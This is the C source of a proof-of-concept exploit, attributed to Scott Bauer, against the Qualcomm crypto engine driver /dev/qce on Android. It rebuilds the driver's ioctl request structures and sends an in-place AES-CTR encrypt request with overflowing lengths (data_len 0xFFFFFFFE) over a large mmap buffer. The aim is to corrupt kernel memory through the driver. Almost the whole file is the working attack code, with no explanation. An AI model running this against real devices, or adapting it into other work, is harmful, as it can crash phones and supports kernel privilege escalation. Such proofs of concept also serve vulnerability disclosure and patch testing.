#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>


/*
 * PoC By Scott Bauer
 * Bug found by derrek
 */


static const char *dev = "/dev/qce";

#define QCEDEV_MAX_KEY_SIZE     64
#define QCEDEV_MAX_IV_SIZE      32
#define QCEDEV_MAX_BUFFERS      16


struct  buf_info {
        union {
                uint32_t        offset;
                uint8_t         *vaddr;
        };
        uint32_t        len;
};
struct  qcedev_vbuf_info {
        struct buf_info src[QCEDEV_MAX_BUFFERS];
        struct buf_info dst[QCEDEV_MAX_BUFFERS];
};

struct  qcedev_pmem_info {
        int             fd_src;
        struct buf_info src[QCEDEV_MAX_BUFFERS];
        int             fd_dst;
        struct buf_info dst[QCEDEV_MAX_BUFFERS];
};

enum qcedev_oper_enum {
        QCEDEV_OPER_DEC         = 0,
        QCEDEV_OPER_ENC         = 1,
        QCEDEV_OPER_DEC_NO_KEY  = 2,
        QCEDEV_OPER_ENC_NO_KEY  = 3,
        QCEDEV_OPER_LAST
};

enum qcedev_cipher_alg_enum {
        QCEDEV_ALG_DES          = 0,
        QCEDEV_ALG_3DES         = 1,
        QCEDEV_ALG_AES          = 2,
        QCEDEV_ALG_LAST
};

enum qcedev_cipher_mode_enum {
        QCEDEV_AES_MODE_CBC     = 0,
        QCEDEV_AES_MODE_ECB     = 1,
        QCEDEV_AES_MODE_CTR     = 2,
        QCEDEV_AES_MODE_XTS     = 3,
        QCEDEV_AES_MODE_CCM     = 4,
        QCEDEV_DES_MODE_CBC     = 5,
        QCEDEV_DES_MODE_ECB     = 6,
        QCEDEV_AES_DES_MODE_LAST
};

struct  qcedev_cipher_op_req {
        uint8_t                         use_pmem;
        union {
                struct qcedev_pmem_info pmem;
                struct qcedev_vbuf_info vbuf;
        };
        uint32_t                        entries;
        uint32_t                        data_len;
        uint8_t                         in_place_op;
        uint8_t                         enckey[QCEDEV_MAX_KEY_SIZE];
        uint32_t                        encklen;
        uint8_t                         iv[QCEDEV_MAX_IV_SIZE];
        uint32_t                        ivlen;
        uint32_t                        byteoffset;
        enum qcedev_cipher_alg_enum     alg;
        enum qcedev_cipher_mode_enum    mode;
        enum qcedev_oper_enum           op;
};

#define QCEDEV_IOC_MAGIC        0x87

#define QCEDEV_IOCTL_ENC_REQ            \
        _IOWR(QCEDEV_IOC_MAGIC, 1, struct qcedev_cipher_op_req)
#define QCEDEV_IOCTL_DEC_REQ            \
        _IOWR(QCEDEV_IOC_MAGIC, 2, struct qcedev_cipher_op_req)



void thread_func(unsigned int start, unsigned int end, int fd)
{
	struct qcedev_cipher_op_req req = { 0 };
	unsigned int i;
	char *data;

	data = mmap(NULL, 0xFFFFFF * 3, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
	if (data == MAP_FAILED) {
		printf("mmap failed, get a better phone\n");
		exit(0);
	}
	for (i = 0; i < 0xFFFFFF * 3; i += sizeof(void*))
		*((unsigned long *)(data + i)) = 0xABADACC355001337;


	req.in_place_op = 1;
	/* setup the parameters to pass a few sanity checks */
	req.entries = 2;
	req.byteoffset = 15;
	req.mode = QCEDEV_AES_MODE_CTR;

	req.op = QCEDEV_OPER_ENC;//_NO_KEY;
	req.ivlen = 1;
	req.data_len = 0xFFFFFFFE;
	req.vbuf.src[0].len = 4;
	req.vbuf.src[1].len = 0xFFFFFFFE - 4;
	req.vbuf.src[0].vaddr = (uint8_t*)data;
	req.vbuf.src[1].vaddr = (uint8_t*)data;
	req.vbuf.dst[0].len = 4;
	req.vbuf.dst[1].len = 0xFFFFFFFE - 4;
	req.vbuf.dst[0].vaddr = (uint8_t*)data;
	req.vbuf.dst[1].vaddr = (uint8_t*)data;

	
	ioctl(fd, QCEDEV_IOCTL_ENC_REQ, &req);

	printf("exiting\n");
	exit(0);
}

int main(void)
{
	int fd;
	unsigned int i;
	unsigned int start = 0;
	unsigned int _gap = ~0;
	unsigned int gap = _gap / 8;
	struct qcedev_cipher_op_req req = { 0 };
	//char data[32] = { A };
	char *data;
	fd = open(dev, O_RDWR);
	if (fd < 0) {
		printf("Failed to open %s with errno %s\n", dev,
		       strerror(errno));
		return EXIT_FAILURE;

	}
	thread_func(start, start + gap, fd);

	sleep(1000000);
	return EXIT_FAILURE;
}
